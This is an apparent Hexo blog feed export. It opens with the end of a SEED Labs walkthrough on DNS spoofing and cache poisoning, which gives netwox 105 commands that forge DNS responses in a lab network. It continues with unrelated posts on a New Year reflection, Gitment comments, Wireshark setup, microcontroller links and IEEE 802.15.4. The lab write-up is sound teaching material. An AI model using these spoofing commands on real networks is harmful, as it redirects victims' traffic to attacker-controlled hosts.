<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo netwox 105 --hostname <span class="string">"www.example.com"</span> --hostnameip 192.168.0.200 --authns <span class="string">"ns.example.com"</span> --authnsip 192.168.0.200 --filter <span class="string">"src host 192.168.0.100"</span></span></div></pre></td></tr></table></figure>
<p>　　配置好以后开始监听，同时，打开 wireshark 以便后续分析攻击结果，当监听到 DNS 请求时，可以在窗口看到生成的 DNS 响应信息，如下图：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/11-3.png" alt="11-3"></p>
<p>　　同时，在客户机也可以看到查到的地址已经变成了攻击者的 IP 地址，证明攻击成功。如下图：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/11-4.png" alt="11-4"></p>
<p>　　查看 wireshark 的抓包信息，可以看到我们通过生成的欺骗 DNS 响应的内容如下，完全符合要求，所以会被 DNS 请求者接收，从而实现 DNS 欺骗。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/11-5.png" alt="11-5"></p>
<h5 id="DNS服务器缓存污染"><a href="#DNS服务器缓存污染" class="headerlink" title="DNS服务器缓存污染"></a>DNS服务器缓存污染</h5><p>　　上面的 DNS 欺骗攻击在每次用户的机器发出www.example.com的 DNS 查询，攻击者的机器都必须发出一个欺骗性的 DNS 响应，这样效率很低，为了达到持久的效果，我们可以进行针对 DNS 服务器进行攻击。</p>
<p>　　当一个 DNS 服务器接收到一个查询时，如果它可以解析则直接解析并响应，当主机名不在它的域中，它将要求其他的 DNS 服务器去解析主机名。当其他的 DNS 服务器将解析结果返回给该服务器后，它将把解析结果存储在缓存中，所以下一次不需要询问其他的 DNS 服务器。如果攻击者可以伪造来自其他 DNS 服务器的响应，那么该 DNS 服务器会接手伪造的 DNS 响应，并在一定时间内将欺骗响应保留在其缓存中。下一次，当用户的机器想要解析相同的主机名时，该 DNS 服务器会使用缓存中的欺骗性响应来回复。这样，攻击者只需要欺骗一次，并且影响将持续到缓存的信息到期。攻击示意图如下：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/11-6.png" alt="11-6"></p>
<p>　　为避免我们要攻击的 DNS 服务器已经有缓存，攻击之前，我们要确保 DNS 服务器的缓存为空，可以使用以下命令刷新缓存：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo rndc flush</span></div></pre></td></tr></table></figure>
<p>　　攻击者使用 Netwox 工具来监听来自 DNS 服务器机的数据包，然后生成一个假的 DNS 响应给我们的 DNS 服务器。Netwox 的命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">sudo netwox 105 --hostname "www.fanzhenyu.me" --hostnameip 192.168.0.200 --authns "ns.fanzhenyu.me" --authnsip 192.168.0.200 --ttl 600 --filter "src host 192.168.0.10" --spoofip "raw"</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/11-7.png" alt="11-7"></p>
<p>　　然后，在用户机使用如下命令发起 DNS 查询请求：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> nslookup www.fanzhenyu.me</span></div></pre></td></tr></table></figure>
<p>　　攻击结果如下图，与没有攻击对比，缓存污染后 DNS 请求的响应已经是被污染的 IP 地址：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/11-8.png" alt="11-8"></p>
<p>　　同时，可以使用如下命令转储和查看 DNS 服务器的缓存：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo rndc dumpdb -cache </span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo cat /var/cache/<span class="built_in">bind</span>/dump.db</span></div></pre></td></tr></table></figure>
<p>　　结果如下图，可以看到缓存已被污染。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/11-9.png" alt="11-9"></p>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>Seed Labs</tag>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title>2018-预见不一样的自己</title>
    <url>/2018/01/01/2018-%E9%A2%84%E8%A7%81%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E8%87%AA%E5%B7%B1/</url>
    <content><![CDATA[<p>　　告别2017最艰难的一周，迎接2018年新的起点。</p>
<a id="more"></a>
<h5 id="2017，遇见不一样的自己"><a href="#2017，遇见不一样的自己" class="headerlink" title="2017，遇见不一样的自己"></a>2017，遇见不一样的自己</h5><p>　　上半年，本科毕业，告别了四年里一起学习、一起玩耍、一起开心、一起难过的同学，指引我努力向上的恩师们，也告别了一起奋斗的实验室小伙伴们。面对现实，再多不舍也会被冲淡，只是我们依然铭记。</p>
<p>　　于是，在2017的最后一天，和本科的老铁一起去了期待四年的省博物馆，然后开车回农大，在校园里逛，在新润一边吃烧烤，一边和同学、助班视频，曾经的记忆扑面而来。或许，这就是情谊，是生活吧。</p>
<p>　　下半年，研究生生活开端，来到更大的平台，接触更多不一样的人，了解越来越多的事情，学习很多新的技能，也尝试了很多一直不敢想的事。于是，也便有了对未来的美好期盼，虽然依然无法看到未来的样子，但是也还一直在为着这些所谓的美好期盼努力着。</p>
<p>　　也因此，面临更大的挫折，有了更多的压力，更多的迷茫，更多的不知所措。但是，我相信未来还是美好的。正所谓，心之所向，素履以往。不忘初心，方能始终。</p>
<p> <img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/1-1.jpg" width="230" height="408" alt="1-1" align="center"></p>
<h5 id="2018，预见不一样的自己"><a href="#2018，预见不一样的自己" class="headerlink" title="2018，预见不一样的自己"></a>2018，预见不一样的自己</h5><p>　　2017，改变不少，但依然少了一份敢闯敢拼的劲头。2018，做不一样的自己。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/1-2.jpg" alt="1-2"></p>
<p>记得有这么一段话，</p>
<p>你要记住大雨中为你撑伞的人</p>
<p>帮你挡住外来之物的人</p>
<p>黑暗中默默抱紧你的人</p>
<p>逗你笑的人</p>
<p>陪你彻夜聊天的人</p>
<p>坐车来看望你的人</p>
<p>陪你哭过的人</p>
<p>在医院陪你的人</p>
<p>总是以你为重的人</p>
<p>是这些人组成你生命中一点一滴的温暖</p>
<p>是这些温暖使你远离阴霾</p>
<p>是这些温暖使你成为善良的人</p>
<p>2017，</p>
<p>谢谢你们，一直都在。</p>
<p>2018，</p>
<p>愿每一个爱我的人和我爱的人，都能被岁月温柔以待。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>Github Pages + Hexo 搭建博客（五）</title>
    <url>/2017/12/03/Github%20Pages%20Hexo%20%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%BA%94%EF%BC%89/</url>
    <content><![CDATA[<p>　　Gitment 是一款基于 GitHub Issues 的评论系统。这篇博客介绍 Hexo 如何集成 Gitment 评论系统。</p>
<a id="more"></a>
<p>　　为了博客能够支持评论，试过很多评论系统，多说挂了，网易云跟帖也挂了，最后换到来必力，但是发现评论经常显示不出来，登录评论后台还得翻墙，于是找到了现在的 Gtiment。</p>
<p>　　对于 Hexo+Github 搭建的博客，使用 Gitment 应该是最好的选择了，因为他是基于 Github 的 Issue 来做的，每篇文章的评论会创建一个 Issue。</p>
<p>　　尽管还有类似的开源项目，比如 Gittalk 也可以实现同样的功能，由于我使用的是 next 主题，所以Gitment的默认样式可能更适合我的博客，虽然样式是可以自定义的，但是对于我这种不回前端的人来说怎么简单怎么来吧。</p>
<h4 id="注册-OAuth-Application"><a href="#注册-OAuth-Application" class="headerlink" title="注册 OAuth Application"></a>注册 OAuth Application</h4><p>　　在 Github 点击右上角个人头像的下拉图标，选择 Setting，然后在打开的页面左边点击 Developer settings，最后点击 New OAuth app。然后填写相关的信息：</p>
<ul>
<li><p>Application name —— 应用名，随便填写</p>
</li>
<li><p>Homepage URL —— 你的博客地址</p>
</li>
<li><p>Application description —— 应用的描述，随便填写</p>
</li>
<li><p>Authorization callback URL —— 你的博客地址</p>
</li>
</ul>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/12/3-1.png" alt="3-1"></p>
<p>　　填写信息完毕后点 Register application 就可以看到刚刚注册好的 OAuth Application 的信息，其中 Client ID 和 Client Secret 在后面要用到。</p>
<h4 id="配置-Hexo-和-next"><a href="#配置-Hexo-和-next" class="headerlink" title="配置 Hexo 和 next"></a>配置 Hexo 和 next</h4><p>　　修改 Next 主题的评论框架布局文件 <code>themes\next\layout\_partials\comments.swig</code>，打开该文件后可以看到关于多说、友言、Disqus 等评论系统已经被添加到评论区布局框架上，所以我们只要在最后添加一个关于 Gitment 的分支即可，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&#123;% elseif theme.gitment.enable %&#125;</div><div class="line">      &#123;% if theme.gitment.lazy %&#125;</div><div class="line">        &lt;div onclick=&quot;showGitment()&quot; id=&quot;gitment-display-button&quot;&gt;&#123;&#123;  __(&apos;gitmentbutton&apos;) &#125;&#125;&lt;/div&gt;</div><div class="line">        &lt;div id=&quot;gitment-container&quot; style=&quot;display:none&quot;&gt;&lt;/div&gt;</div><div class="line">      &#123;% else %&#125;</div><div class="line">        &lt;div id=&quot;gitment-container&quot;&gt;&lt;/div&gt;</div><div class="line">      &#123;% endif %&#125;</div></pre></td></tr></table></figure>
<p>　　Gitment 评论系统的调用接口已经做好，但是还没有具体实现，所以接着我们在 <code>themes\next\layout\_third-party\comments</code> 增加一个文件 gitment.swig，并在里面添加具体实现：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&#123;% if theme.gitment.enable %&#125;</div><div class="line">    &#123;% set owner = theme.gitment.owner %&#125;</div><div class="line">    &#123;% set repo = theme.gitment.repo %&#125;</div><div class="line">    &#123;% set cid = theme.gitment.client_id %&#125;</div><div class="line">    &#123;% set cs = theme.gitment.client_secret %&#125;</div><div class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://imsun.github.io/gitment/style/default.css&quot;&gt;</div><div class="line">    &lt;script src=&quot;https://imsun.github.io/gitment/dist/gitment.browser.js&quot;&gt;&lt;/script&gt;</div><div class="line">    &#123;% if theme.gitment.lazy %&#125;</div><div class="line">        &lt;script type=&quot;text/javascript&quot;&gt;</div><div class="line">            function showGitment()&#123;</div><div class="line">                document.getElementById(&quot;gitment-display-button&quot;).style.display = &quot;none&quot;;</div><div class="line">                document.getElementById(&quot;gitment-container&quot;).style.display = &quot;block&quot;;</div><div class="line">                var gitment = new Gitment(&#123;</div><div class="line">                        id: window.location.pathname,</div><div class="line">                        owner: &apos;&#123;&#123;owner&#125;&#125;&apos;,</div><div class="line">                        repo: &apos;&#123;&#123;repo&#125;&#125;&apos;,</div><div class="line">                        oauth: &#123;</div><div class="line">                            client_id: &apos;&#123;&#123;cid&#125;&#125;&apos;,</div><div class="line">                            client_secret: &apos;&#123;&#123;cs&#125;&#125;&apos;,</div><div class="line">                        &#125;&#125;);</div><div class="line">                gitment.render(&apos;gitment-container&apos;);</div><div class="line">            &#125;</div><div class="line">        &lt;/script&gt;</div><div class="line">    &#123;% else %&#125;</div><div class="line">        &lt;script type=&quot;text/javascript&quot;&gt;</div><div class="line">            var gitment = new Gitment(&#123;</div><div class="line">                    id: window.location.pathname,</div><div class="line">                    owner: &apos;&#123;&#123;owner&#125;&#125;&apos;,</div><div class="line">                    repo: &apos;&#123;&#123;repo&#125;&#125;&apos;,</div><div class="line">                    oauth: &#123;</div><div class="line">                        client_id: &apos;&#123;&#123;cid&#125;&#125;&apos;,</div><div class="line">                        client_secret: &apos;&#123;&#123;cs&#125;&#125;&apos;,</div><div class="line">                    &#125;&#125;);</div><div class="line">            gitment.render(&apos;gitment-container&apos;);</div><div class="line">        &lt;/script&gt;</div><div class="line">    &#123;% endif %&#125;</div><div class="line">&#123;% endif %&#125;</div></pre></td></tr></table></figure>
<p>　　然后在 <code>themes\next\layout\_third-party\comments\index.swig</code> 添加一行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&#123;% include &apos;gitment.swig&apos; %&#125;</div></pre></td></tr></table></figure>
<p>　　最后，在 NexT 主题配置文件中配置一下Gitment，在 <code>themes\next\_config.yml</code> 中添加以下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"># Gitment</div><div class="line">gitment:</div><div class="line">    enable: true    # gitment评论系统开关</div><div class="line">    lazy: true  # 评论懒加载开关</div><div class="line">    owner: fzy-Line # GitHub用户名</div><div class="line">    repo: fzyLine.github.io # 存储评论数据的GitHub仓库的仓库名</div><div class="line">    client_id:  # 复制注册OAuth Application后得到的Client ID</div><div class="line">    client_secret:  # 复制注册OAuth Application后得到的Client Secret</div></pre></td></tr></table></figure>
<h4 id="常见错误"><a href="#常见错误" class="headerlink" title="常见错误"></a>常见错误</h4><h5 id="Error-Not-Found"><a href="#Error-Not-Found" class="headerlink" title="Error: Not Found"></a>Error: Not Found</h5><p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/12/3-2.png" alt="3-2"></p>
<p>　　出现这样错误的原因主要是：</p>
<ul>
<li>repo 指定的仓库名对应的仓库在 GitHub 上根本不存在，应该修改为正确的仓库名，最好就是用自己博客所使用那个仓库，这样的话所有的评论创建的 Issue 就是博客仓库的 Issue。</li>
<li>repo 指定的值是其仓库地址，而不是仓库名，应该修改为仓库名。</li>
</ul>
<h5 id="Error-Comments-Not-Initialized"><a href="#Error-Comments-Not-Initialized" class="headerlink" title="Error: Comments Not Initialized"></a>Error: Comments Not Initialized</h5><p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/12/3-3.png" alt="3-3"></p>
<p>　　出现这样错误的原因主要是：</p>
<p>－　在注册 OAuth Application 时，Authorization callback URL 填写的地址错误<br>－　还没有在该页面的 Gitment 评论区登陆 GitHub 账号，需点击 login 登录 Github，然后点击初始化按钮进行初始化。</p>
<h5 id="Issues-重复初始化"><a href="#Issues-重复初始化" class="headerlink" title="Issues 重复初始化"></a>Issues 重复初始化</h5><p>　　这个问题在 Gitment 的 Github 项目 Issue 中也有很多人提到，貌似还是个 BUG，没有得到解决。所以，只有自己多多注意啦。</p>
<p>　　不要在初始化一篇文章后再去点浏览器的返回按钮然后再回到原来的这篇文章，这样的话，虽然创建了一个 Issue，但是初始化按钮还是会存在，如果你再去点就会出现两个 Issue。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>　　当然，Gitment 也有它的不足，目前它只能用 Github 账号登录来评论。但是，对于技术博客，特别是IT技术博客，这样也足够了，看你博客的人基本也是这个行业的，而 Github 又那么有名，所以基本大家都有账号。</p>
<p>　　由于每一篇文章都要初始化，对于之前写了很多博客的人来说，之前这些文章的初始化确实是个问题，比如写了 100 多篇的我，乖乖的手动为每一篇点了一下初始化。当然，也有人做了自动化初始化的脚本，大家可以试试。</p>
<p>　　自动初始化 Gitalk 和 Gitment 评论：<br><a href="https://draveness.me/git-comments-initialize" target="_blank" rel="external">https://draveness.me/git-comments-initialize</a></p>
<p>　　更详细的介绍可以在我参考的这篇博客中找到答案：</p>
<p>　　添加 Gitment 评论系统到 Hexo 主题 NexT：<br><a href="https://extremegtr.github.io/2017/09/07/Add-Gitment-comment-system-to-hexo-theme-NexT/" target="_blank" rel="external">https://extremegtr.github.io/2017/09/07/Add-Gitment-comment-system-to-hexo-theme-NexT/</a></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 16.04 LTS 中安装 Wireshark</title>
    <url>/2017/12/02/Ubuntu%2016.04%20LTS%20%E4%B8%AD%E5%AE%89%E8%A3%85%20Wireshark/</url>
    <content><![CDATA[<p>　　经常分析不同的网络协议和研究数据包的人一定经常使用 Wireshark。</p>
<a id="more"></a>
<p>　　虽然 Linux 也有像 tcpdump 这样的工具来实现抓包，但是与难以操作的命令行网络协议分析工具不同的是，Wireshark 拥有非常简洁易用的图形界面，使用 Wireshark 可以很容易地查看有线和无线网络的实时信息。</p>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>　　打开一个终端：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install wireshark</span></div></pre></td></tr></table></figure>
<h4 id="运行与配置"><a href="#运行与配置" class="headerlink" title="运行与配置"></a>运行与配置</h4><p>　　安装完成后使用非 root 直接运行 wireshark 的话，由于权限不足，所以无法识别网卡，只能打开 pcap 的文件，所以我们需要使用 sudo 提升权限。</p>
<p>　　默认情况下，访问网络端口需要 root 权限，而 wireshark 的只是 /usr/share/dumpcap 的一个 UI，/usr/share/dumpcap 需要 root 权限，所以没法 non-root 用户无法读取网卡列表。</p>
<h5 id="root运行"><a href="#root运行" class="headerlink" title="root运行"></a>root运行</h5><p>　　打开一个终端：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo wireshark</span></div></pre></td></tr></table></figure>
<p>　　但是，这样如果使用 root 运行则可能会报错：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/12/2-1.png" alt="2-1"></p>
<p>　　要对 init.lua 进行修改，终端运行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo gedit /usr/share/wireshark/init.lua</span></div></pre></td></tr></table></figure>
<p>　　将倒数第二行改为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">--dofile(DATA_DIR..&quot;console.lua&quot;)</div></pre></td></tr></table></figure>
<p>　　再启动软件就 OK 啦。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo wireshark</span></div></pre></td></tr></table></figure>
<h5 id="非-root-运行"><a href="#非-root-运行" class="headerlink" title="非 root 运行"></a>非 root 运行</h5><p>　　虽然可以使用 root 成功运行 wireshark，但是 wireshark 官方不推荐这么做：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Running as user &quot;root&quot; and group &quot;root&quot;.</div><div class="line">This could be dangerous.</div></pre></td></tr></table></figure>
<p>　　另外，这样做也不是很方便，特别是在使用桌面版时，如果要通过放置在侧边栏的图标打开 wireshark 时，默认是不会使用 root 用户打开的，所以我们需要设置 wireshark 为非 root 用户也能执行。</p>
<ul>
<li>添加 wireshark 用户组</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo groupadd  wireshark</span></div></pre></td></tr></table></figure>
<ul>
<li>将 dumpcap 更改为 wireshark 用户组</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo chgrp wireshark /usr/bin/dumpcap</span></div></pre></td></tr></table></figure>
<ul>
<li>让 wireshark 用户组有 root 权限使用 dumpcap</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo chmod 4755 /usr/bin/dumpcap</span></div></pre></td></tr></table></figure>
<ul>
<li>将需要使用的普通用户名加入 wireshark 用户组，例如我的用户是“fzy”，则需要使用命令：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo gpasswd -a fzy wireshark</span></div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
        <tag>wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title>51单片机学习系列博客整理</title>
    <url>/2017/11/26/51%20%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97%E5%8D%9A%E5%AE%A2%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<p>　　整理 2015 年写的一些单片机相关的博客。</p>
<a id="more"></a>
<p>　　2015 年我开始在 CSDN 写博客，当时自己在学院的电子设计创新实验室，主要学习单片机和嵌入式开发。同时，我们也在为电子协会讲课，51 单片机是嵌入式入门的基础，也是电子协会讲课的内容。</p>
<p>　　那段时间，我不仅整理知识点做PPT，还把内容分享到 CSDN 博客。时至今日，这些博客依然还有人在评论，也有人私信我，可以说这是我没有想到的。在这里整理一下这些博客文章：</p>
<ul>
<li><p>51 单片机矩阵键盘扫描：<br><a href="http://blog.csdn.net/u013151320/article/details/46621645" target="_blank" rel="external">http://blog.csdn.net/u013151320/article/details/46621645</a></p>
</li>
<li><p>51 单片机数码管详解：<br><a href="http://blog.csdn.net/u013151320/article/details/49885679" target="_blank" rel="external">http://blog.csdn.net/u013151320/article/details/49885679</a></p>
</li>
<li><p>51 单片机中断详解（上）：<br><a href="http://blog.csdn.net/u013151320/article/details/49977813" target="_blank" rel="external">http://blog.csdn.net/u013151320/article/details/49977813</a></p>
</li>
<li><p>51 单片机中断详解（中）：<br><a href="http://blog.csdn.net/u013151320/article/details/50034627" target="_blank" rel="external">http://blog.csdn.net/u013151320/article/details/50034627</a></p>
</li>
<li><p>51 单片机中断详解（下）：<br><a href="http://blog.csdn.net/u013151320/article/details/50120063" target="_blank" rel="external">http://blog.csdn.net/u013151320/article/details/50120063</a></p>
</li>
<li><p>51 单片机串口通信：<br><a href="http://blog.csdn.net/u013151320/article/details/50125257" target="_blank" rel="external">http://blog.csdn.net/u013151320/article/details/50125257</a></p>
</li>
<li><p>51 单片机 DS1302 实时时钟驱动程序：<br><a href="http://blog.csdn.net/u013151320/article/details/50221091" target="_blank" rel="external">http://blog.csdn.net/u013151320/article/details/50221091</a></p>
</li>
<li><p>51 单片机 I2C 总线驱动程序：<br><a href="http://blog.csdn.net/u013151320/article/details/50265967" target="_blank" rel="external">http://blog.csdn.net/u013151320/article/details/50265967</a></p>
</li>
<li><p>51 单片机 LCD1602 程序详解：<br><a href="http://blog.csdn.net/u013151320/article/details/46663167" target="_blank" rel="external">http://blog.csdn.net/u013151320/article/details/46663167</a></p>
</li>
<li><p>51 单片机 AD 转换之 PCF8591：<br><a href="http://blog.csdn.net/u013151320/article/details/50310231" target="_blank" rel="external">http://blog.csdn.net/u013151320/article/details/50310231</a></p>
</li>
<li><p>51 单片机 DHT11 温湿度传感器：<br><a href="http://blog.csdn.net/u013151320/article/details/50389624" target="_blank" rel="external">http://blog.csdn.net/u013151320/article/details/50389624</a></p>
</li>
</ul>
<p>　　51 单片机基本的编程就是这些，当时也只写了这些，加入了一些自己的理解，分享出来希望对大家有帮助。</p>
<p>　　现在虽然我已经不再做这个，但是我认为 51 单片机是我现在学习的一个基础，有了这个基础，你再接触更复杂的嵌入式开发板都能够搞定，原理都是一样的，学会看原理图、芯片手册等资料就能玩得动。</p>
<p>　　当然，也可以利用单片机来做一些实际的开发。比如，当时随着串口 Wi-Fi 模块的推出，以及物联网云平台的兴起，我们做了一些网络通信的小项目，将单片机通过传感器采集的数据传输到云端进行存储，然后再通过手机去获取并展示数据，同时也可以实现远程控制。</p>
<p>　　在现在看来，这些都是已经是十分成熟的技术路线了。所以，学习完 51 单片机的基础知识，建议学习一下 STM32 等稍微高端的一点的单片机，结合网络协议、云端技术以及物联网操作系统去做一些小项目来进行练习。</p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>Embedded system</category>
      </categories>
      <tags>
        <tag>51 单片机</tag>
      </tags>
  </entry>
  <entry>
    <title>IEEE 802.15.4 标准学习笔记</title>
    <url>/2017/11/25/IEEE-802-15-4%E6%A0%87%E5%87%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>　　IEEE 802.15.4 是定义低速率无线个域网（LR-WPAN）操作的技术标准。它规定了 LR-WPAN 的物理层和媒体访问控制，由 IEEE 802.15 工作组维护。</p>
<a id="more"></a>
<h4 id="IEEE-802-15-4标准简介"><a href="#IEEE-802-15-4标准简介" class="headerlink" title="IEEE 802.15.4标准简介"></a>IEEE 802.15.4标准简介</h4><p>　　LR-WPAN（低速无线个域网）是一种简单，低成本的通信网络，可在具有有限功率和松散吞吐量要求的应用中实现无线连接。LR-WPAN 的主要目标是易于安装，可靠的数据传输，极低的成本和合理的电池寿命，同时保持简单灵活的协议。</p>
<p>　　IEEE 802.15.4 标准工作组致力于在固定、便携及移动的廉价设备之间实现低复杂度、低成本且功耗极低的无线连接，其把应用领域重点放在无线传感器网络上。</p>
<p>　　它是 ZigBee、ISA100.11a、WirelessHART 和 Thread 等规范的基础，每个规范都通过开发 IEEE 802.15.4 中未定义的上层来进一步扩展标准。或者，它可以与 6LoWPAN 一起使用来定义上层。</p>
<p>　　IEEE 802.15.4 标准的主要特征：</p>
<ul>
<li>支持星型和点到点两种拓扑结构；</li>
<li>在网络中采取两种地址方式：16 位地址和 64 位地址。其中 16 位地址是有协调器分配的，64 位地址是全球唯一的扩展地址；</li>
<li>采用可选的时槽保障（Guaranteed Time Slots，GTS）机制；</li>
<li>采用带冲突避免的载波侦听多路访问（Carrier sense multiple access with collision avoidance，CSMA-CA）的信道访问机制;</li>
<li>支持 ACK 机制以保证可靠传输；</li>
<li>低功耗机制；</li>
<li>信道能量检测（Energy Detection，ED）；</li>
<li>链路质量指示（Link quality indication，LQI）；</li>
</ul>
<h4 id="网络组成"><a href="#网络组成" class="headerlink" title="网络组成"></a>网络组成</h4><p>　　IEEE 802.15.4 网络由一个 PAN 协调器和至少一个网络设备组成。每个网络包含一个专用中央网络协调器，称为 PAN 协调器。只有 PAN 协调器可以建立新网络，并且定义网络的结构和运行模式。其他设备通过加入到向 PAN 协调器申请加入到网络中来。除了 PAN 协调器外，IEEE 802.15.4 标准还定义了两种设备：协调器与网络设备。协调器为网络中其他设备提供协调服务。</p>
<p>　　两种不同的设备类型可以参与 IEEE 802.15.4 网络：全功能设备（FFD）和精简功能设备（RFD）。FFD 包含全部 MAC 服务，可以实现全部三种功能：PAN 协调器、协调器和网络设备，RFD 包含精简的 MAC 服务，只能用作网络设备。</p>
<p>　　FFD 是能够用作个人区域网络（PAN）协调器或协调器的设备，而 RFD 则不能。RFD 适用于非常简单的应用，它不需要发送大量的数据，并且一次只能与单个FFD相关联。因此，RFD 可以使用最少的资源和存储容量来实现。</p>
<h4 id="网络拓扑结构"><a href="#网络拓扑结构" class="headerlink" title="网络拓扑结构"></a>网络拓扑结构</h4><p>　　根据应用要求，IEEE 802.15.4 LR-WPAN 以两种拓扑结构中的任一种运行：星形拓扑或对等拓扑。在星形拓扑中，通信建立在设备和单个中央控制器之间，称为 PAN 协调器。设备通常具有一些相关联的应用，并且是网络通信的起始点或终止点。PAN协调器还可以具有特定的应用，但它可以用于启动，终止或路由网络周围的通信。  PAN 协调器是 PAN 的主要控制器。</p>
<p>　　在任一拓扑网络上运行的所有设备都有唯一的地址，称为扩展地址。设备将使用扩展地址进行 PAN 内的直接通信或 PAN 协调器在设备关联时分配的短地址。PAN 协调器通常由主电源供电，而这些设备最有可能由电池供电。</p>
<p><img src="http://ohe7ixo05.bkt.clouddn.com/2017/11/25-1.png" alt="25-1"></p>
<p>　　对等拓扑也具有 PAN 协调器；然而，它与星形拓扑不同之处在于，只要它们在彼此的范围内，任何设备都能够与任何其他设备通信。对等拓扑允许实现更复杂的网络结构，例如网状网络拓扑。对等网络允许多跳将消息从任何设备路由到网络上的任何其他设备。这些功能可以在较高层添加，但不属于此标准。</p>
<p>　　每个独立的 PAN 选择唯一的标识符。该 PAN 标识符允许使用短地址在网络内的设备之间进行通信，并实现跨独立网络的设备之间的传输。选择标识符的机制不属于本标准的范围。</p>
<h5 id="星形拓扑"><a href="#星形拓扑" class="headerlink" title="星形拓扑"></a>星形拓扑</h5><p>　　星形网络的基本结构如上图所示。在星形网络拓扑结构中，通信由一个 PAN 协调器控制，这个 PAN 协调器作为网络的主控设备，发送实现设备同步的信标帧（包括超帧控制），并且维护关联的管理。</p>
<p>（1）网络建立流程</p>
<p>　　任何 FFD 在被激活之后，它可以建立自己的网络并成为 PAN 协调器。所有星形网络独立于当前正在运行的所有其他星形网络。在一个新的星形网络形成的过程中，PAN 协调器必须选择一个网络标识符（PAN ID），这个PAN ID 不应该被网络周围的任何相邻网络所占用。PAN 协调器周期性地扫描所有可用的或者可选择的信道，寻找已经建立的网络，然后选择一个和他们都不同的 PAN ID。之后，PAN 协调器才开始周期性地发送信标，允许其他设备（可能是 FFD 和 RFD）加入其网络。</p>
<p>（2）特点</p>
<ul>
<li>所有设备都与中心设备 PAN 网络协调器通讯。</li>
<li>网络协调器持续供电，其他设备电池供电。</li>
<li>适合家庭自动化、个人计算机外围设备、个人康护护理等小范围的室内应用。</li>
</ul>
<h5 id="对等拓扑"><a href="#对等拓扑" class="headerlink" title="对等拓扑"></a>对等拓扑</h5><p>　　在对等拓扑中，每个设备能够与其无线电通信范围内的任何其他设备进行通信，并且可以通过多条路由将报文传递给其射频通信范围外的设备。对等网络也可以有精简功能设备，但只能作为外围设备，因为它们不具备转发数据报的功能，也因此，对等网络中必须有足够多的全功能设备来形成网络。</p>
<p>（1）网络建立流程</p>
<p>　　任何一个 FFD 使自己成为一个 PAN 协调器，并选择一个与其附近的其他网络不同的 PAN ID，就可以建成一个新的对等网络。</p>
